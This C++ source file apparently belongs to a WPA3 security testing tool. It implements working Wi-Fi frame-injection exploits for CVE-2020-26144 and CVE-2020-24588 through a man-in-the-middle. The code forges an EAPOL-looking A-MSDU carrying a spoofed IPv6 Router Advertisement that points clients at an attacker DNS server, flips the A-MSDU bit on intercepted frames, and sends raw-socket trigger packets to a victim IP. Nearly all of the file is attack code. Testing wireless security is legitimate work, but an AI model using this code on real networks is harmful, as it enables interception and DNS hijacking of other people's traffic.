#include "attacks/mc_mitm/amsdu/amsdu.h"

#include <arpa/inet.h>
#include <cerrno>
#include <cstring>
#include <netinet/in.h>
#include <numeric>
#include <sys/socket.h>
#include <tins/tins.h>

#include "attacks/mc_mitm/mc_mitm_hooks.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/log.h"

namespace wpa3_tester::amsdu {
using namespace std;
using namespace Tins;


// Hooks: fire CVE-2020-26144 injection once the MitM is live
namespace {
class AmsduHooks : public McMitmHooks {
    AmsduAttack *attack_;
public:
    explicit AmsduHooks(AmsduAttack *a) : attack_(a) {}
    void on_client_connected(McMitm &) override {
        attack_->inject_amsdu_26144();
        attack_->send_trigger_24588();
    }
};
}

void AmsduAttack::run(RunStatus &rs, int timeout_sec) {
    if(!victim_ip.empty() && watch_inner_size == 0)
        watch_inner_size = compute_watch_inner_size();
    set_hooks(make_unique<AmsduHooks>(this));
    McMitm::run(rs, timeout_sec);
}

// CVE-2020-24588 - detect trigger frame, flip A-MSDU bit
bool AmsduAttack::is_trigger_frame(const frame_raw_t &raw) const {
    if(watch_inner_size == 0 || cve24588_flipped_) return false;
    if(client_state.get_state() < ClientState::GotMitm) return false;
    if(raw.size() < 4) return false;

    const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | static_cast<uint16_t>(raw[3]) << 8;
    if(raw.size() < rt_len + 26u) return false;  // need MAC hdr + QoS byte

    const size_t inner = raw.size() - rt_len;
    if(inner != watch_inner_size) return false;

    const uint8_t fc0 = raw[rt_len];
    const uint8_t fc1 = raw[rt_len + 1];
    if((fc0 >> 2 & 0x03) != 2) return false;   // type must be DATA (2)
    if(fc0 >> 4 != 8) return false;             // subtype must be QoS Data (8)
    if(!(fc1 & 0x02)) return false;               // FromDS must be 1 (from AP)
    if(fc1 & 0x01) return false;                  // ToDS must be 0 (to client)
    return true;
}

void AmsduAttack::flip_amsdu_bit(frame_raw_t &raw) {
    if(raw.size() < 4) return;
    const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (static_cast<uint16_t>(raw[3]) << 8);
    const size_t qos_off = rt_len + 24u;  // 802.11 MAC header = 24 bytes
    if(raw.size() <= qos_off) return;
    raw[qos_off] |= 0x80;  // A-MSDU Present = bit 7 of QoS Control byte 0
}

void AmsduAttack::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
    if(is_trigger_frame(raw)) {
        log(LogLevel::INFO, "A-MSDU CVE-2020-24588: trigger frame (inner={}B), flipping A-MSDU bit", watch_inner_size);
        frame_raw_t modified = raw;
        flip_amsdu_bit(modified);
        send_to_rogue(modified);
        cve24588_flipped_ = true;
        return;
    }
    McMitm::handle_rx_real_chan(pdu, raw);
}

// CVE-2020-26144 - plaintext EAPOL-looking A-MSDU injection
// A-MSDU subframe:  dst(6) + src(6) + len(2) + data + padding
vector<uint8_t> AmsduAttack::build_subframe(
    const HWAddress<6> &dst, const HWAddress<6> &src,
    const vector<uint8_t> &data, const bool last)
{
    vector<uint8_t> sf;
    sf.insert(sf.end(), dst.begin(), dst.end());
    sf.insert(sf.end(), src.begin(), src.end());
    uint16_t len = static_cast<uint16_t>(data.size());
    sf.push_back(len >> 8);
    sf.push_back(len & 0xFF);
    sf.insert(sf.end(), data.begin(), data.end());
    if(!last)
        while(sf.size() % 4 != 0) sf.push_back(0);
    return sf;
}

// ICMPv6 RA body (type=134) with RDNSS option, checksum over pseudo-header
vector<uint8_t> AmsduAttack::build_icmpv6_ra(
    const IPv6Address &src, const IPv6Address &dst, const IPv6Address &dns)
{
    vector<uint8_t> body;
    // ICMPv6 RA fixed fields (16 bytes)
    body.push_back(134);    // type = Router Advertisement
    body.push_back(0);      // code
    body.push_back(0);      // checksum hi placeholder
    body.push_back(0);      // checksum lo placeholder
    body.push_back(64);     // hop limit
    body.push_back(0x08);   // O flag (stateless config: use RDNSS)
    body.push_back(0x07);   // router lifetime hi (1800 = 0x0708)
    body.push_back(0x08);   // router lifetime lo
    for(int i = 0; i < 8; i++) body.push_back(0);  // reachable_time + retrans_timer

    // RDNSS option (RFC 8106): type=25, length=3 (3x8=24 bytes)
    body.push_back(25);     // type
    body.push_back(3);      // length in 8-byte units
    body.push_back(0); body.push_back(0);  // reserved
    // lifetime = 1800
    body.push_back(0x00); body.push_back(0x00);
    body.push_back(0x07); body.push_back(0x08);
    for(auto b : dns) body.push_back(b);  // 16-byte DNS IPv6 address

    // ICMPv6 checksum over pseudo-header + body
    vector<uint8_t> pseudo;
    for(auto b : src) pseudo.push_back(b);
    for(auto b : dst) pseudo.push_back(b);
	const uint32_t icmpv6_len = static_cast<uint32_t>(body.size());
    pseudo.push_back(icmpv6_len >> 24 & 0xFF);
    pseudo.push_back(icmpv6_len >> 16 & 0xFF);
    pseudo.push_back(icmpv6_len >> 8 & 0xFF);
    pseudo.push_back( icmpv6_len        & 0xFF);
    pseudo.push_back(0); pseudo.push_back(0); pseudo.push_back(0);
    pseudo.push_back(58);  // next header = ICMPv6

    auto buf = pseudo;
    buf.insert(buf.end(), body.begin(), body.end());
    if(buf.size() % 2 != 0) buf.push_back(0);  // pad to even

    uint32_t sum = 0;
    for(size_t i = 0; i < buf.size(); i += 2)
        sum += static_cast<uint32_t>(buf[i]) << 8 | buf[i + 1];
    while(sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t cksum = ~static_cast<uint16_t>(sum);
    body[2] = cksum >> 8;
    body[3] = cksum & 0xFF;

    return body;
}

vector<uint8_t> AmsduAttack::build_amsdu_payload() const {
    // ---- subframe 2: ICMPv6 RA broadcast (last subframe) ----
    static constexpr uint8_t SNAP_IPV6[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x86, 0xDD};

    const IPv6Address src_v6("fe80::1");
    const IPv6Address dst_v6("ff02::1");
    const IPv6Address dns_v6(attacker_dns_v6);

    auto icmpv6 = build_icmpv6_ra(src_v6, dst_v6, dns_v6);

    // IPv6 header (40 bytes)
    vector<uint8_t> ipv6;
    ipv6.push_back(0x60); ipv6.push_back(0); ipv6.push_back(0); ipv6.push_back(0);
    uint16_t plen = static_cast<uint16_t>(icmpv6.size());
    ipv6.push_back(plen >> 8); ipv6.push_back(plen & 0xFF);
    ipv6.push_back(58);    // next = ICMPv6
    ipv6.push_back(255);   // hop limit
    for(auto b : src_v6) ipv6.push_back(b);
    for(auto b : dst_v6) ipv6.push_back(b);
    ipv6.insert(ipv6.end(), icmpv6.begin(), icmpv6.end());

    vector<uint8_t> sf2_data(SNAP_IPV6, SNAP_IPV6 + 8);
    sf2_data.insert(sf2_data.end(), ipv6.begin(), ipv6.end());

    const HWAddress<6> bcast("ff:ff:ff:ff:ff:ff");
    const HWAddress<6> ap_mac(ap.get(SK::mac));
    auto sf2 = build_subframe(bcast, ap_mac, sf2_data, true);

    // ---- subframe 1: EAPOL-looking (first 8 bytes = AA AA 03 00 00 00 88 8E) ----
    // dest MAC bytes 0-5 = AA:AA:03:00:00:00 (first 6 bytes of LLC/SNAP EAPOL)
    // src MAC bytes 0-1 = 88:8E               (last 2 bytes of LLC/SNAP EAPOL EtherType)
    const HWAddress<6> sf1_dst("aa:aa:03:00:00:00");
    const HWAddress<6> sf1_src("88:8e:00:00:00:00");
    const vector<uint8_t> sf1_data = {0x00, 0x00, 0x00, 0x00};  // minimal data
    auto sf1 = build_subframe(sf1_dst, sf1_src, sf1_data, false);

    vector<uint8_t> payload;
    payload.insert(payload.end(), sf1.begin(), sf1.end());
    payload.insert(payload.end(), sf2.begin(), sf2.end());
    return payload;
}

void AmsduAttack::inject_amsdu_26144() {
    if(!inject_eapol_amsdu || cve26144_injected_) return;
    cve26144_injected_ = true;

    log(LogLevel::INFO, "A-MSDU CVE-2020-26144: injecting plaintext EAPOL A-MSDU -> real AP (dns={})", attacker_dns_v6);

    const auto ap_mac = HWAddress<6>(ap.get(SK::mac));
    const auto client_mac = client_state.get_mac();

    // Dot11QoSData: client -> AP (toDS=1, fromDS=0)
    Dot11QoSData frame(ap_mac, client_mac);
    frame.addr3(ap_mac);
    frame.to_ds(1);
    frame.from_ds(0);
    // A-MSDU Present = bit 7 of QoS Control byte 0 (little-endian: 0x0080)
    frame.qos_control(0x0080);

    frame.inner_pdu(RawPDU(build_amsdu_payload()));
    send_to_real(frame);
}

// CVE-2020-24588 - trigger packet sender (C++ raw socket)
uint16_t AmsduAttack::ip_checksum(const uint8_t *buf, const size_t len) {
    uint32_t sum = 0;
    for(size_t i = 0; i + 1 < len; i += 2)
        sum += static_cast<uint32_t>(buf[i]) << 8 | buf[i + 1];
    if(len & 1) sum += static_cast<uint32_t>(buf[len - 1]) << 8;
    while(sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~static_cast<uint16_t>(sum);
}

size_t AmsduAttack::compute_watch_inner_size() {
    const auto payload = build_amsdu_payload();
    // sf1 = dst(6)+src(6)+len(2)+data(4) = 18 B, padded to 20 (18%4==2, not last)
    const size_t sf2_size = payload.size() - 20;
    // inner = MAC_hdr(24)+QoS(2)+CCMP_hdr(8)+LLC/SNAP(8)+IP_hdr(20)+TCP_hdr(20)+sf2+CCMP_MIC(8)
    return 90 + sf2_size;
}

void AmsduAttack::send_trigger_24588() {
    if(victim_ip.empty() || cve24588_flipped_) return;

    log(LogLevel::INFO, "A-MSDU CVE-2020-24588: sending {} trigger packets to {}", trigger_count, victim_ip);

    // TCP payload = sf2 (bytes [20..] of full A-MSDU payload)
    const auto full = build_amsdu_payload();
    const vector<uint8_t> sf2(full.begin() + 20, full.end());

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    if(inet_pton(AF_INET, victim_ip.c_str(), &dst.sin_addr) != 1) {
        log(LogLevel::ERROR, "A-MSDU CVE-2020-24588: invalid victim_ip '{}'", victim_ip);
        return;
    }
    // dst.sin_addr.s_addr is in network byte order (big-endian)
    const uint8_t *dst_b = reinterpret_cast<const uint8_t *>(&dst.sin_addr.s_addr);
    constexpr uint8_t src_b[4] = {10, 0, 0, 1};  // attacker source IP

    const uint16_t total_len = static_cast<uint16_t>(40 + sf2.size());  // IP(20)+TCP(20)+sf2

    vector<uint8_t> pkt;
    pkt.reserve(total_len);
    auto w16 = [&](uint16_t v) { pkt.push_back(v >> 8); pkt.push_back(v & 0xFF); };

    // IP header
    pkt.push_back(0x45);           // ver=4, ihl=5
    pkt.push_back(0x00);           // dscp/ecn
    w16(total_len);
    w16(34);                       // id=34: A-MSDU subframe-1 length field = IP.id
    w16(0x4000);                   // DF, frag_offset=0
    pkt.push_back(64);             // ttl
    pkt.push_back(6);              // proto=TCP
    pkt.push_back(0); pkt.push_back(0);  // checksum placeholder
    pkt.insert(pkt.end(), src_b, src_b + 4);
    pkt.insert(pkt.end(), dst_b, dst_b + 4);
    const uint16_t ip_cs = ip_checksum(pkt.data(), 20);
    pkt[10] = ip_cs >> 8; pkt[11] = ip_cs & 0xFF;

    // TCP header
    const size_t tcp_off = pkt.size();
    w16(12345);  // sport
    w16(80);     // dport
    for(int i = 0; i < 8; i++) pkt.push_back(0);  // seq + ack = 0
    pkt.push_back(0x50);  // data_offset=5 (20 B)
    pkt.push_back(0x02);  // SYN
    w16(65535);           // window
    pkt.push_back(0); pkt.push_back(0);  // checksum placeholder
    w16(0);               // urgent

    pkt.insert(pkt.end(), sf2.begin(), sf2.end());

    // TCP checksum over pseudo-header
    const uint16_t tcp_len = static_cast<uint16_t>(20 + sf2.size());
    vector<uint8_t> pseudo;
    pseudo.insert(pseudo.end(), src_b, src_b + 4);
    pseudo.insert(pseudo.end(), dst_b, dst_b + 4);
    pseudo.push_back(0); pseudo.push_back(6);
    pseudo.push_back(tcp_len >> 8); pseudo.push_back(tcp_len & 0xFF);
    pseudo.insert(pseudo.end(), pkt.begin() + static_cast<ptrdiff_t>(tcp_off), pkt.end());
    if(pseudo.size() & 1) pseudo.push_back(0);
    const uint16_t tcp_cs = ip_checksum(pseudo.data(), pseudo.size());
    pkt[tcp_off + 16] = tcp_cs >> 8;
    pkt[tcp_off + 17] = tcp_cs & 0xFF;

    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(fd < 0) {
        log(LogLevel::ERROR, "A-MSDU CVE-2020-24588: raw socket failed: {}", strerror(errno));
        return;
    }
	constexpr int on = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    for(int i = 0; i < trigger_count; ++i)
        sendto(fd, pkt.data(), pkt.size(), 0,
               reinterpret_cast<const sockaddr *>(&dst), sizeof(dst));
    close(fd);
}

}
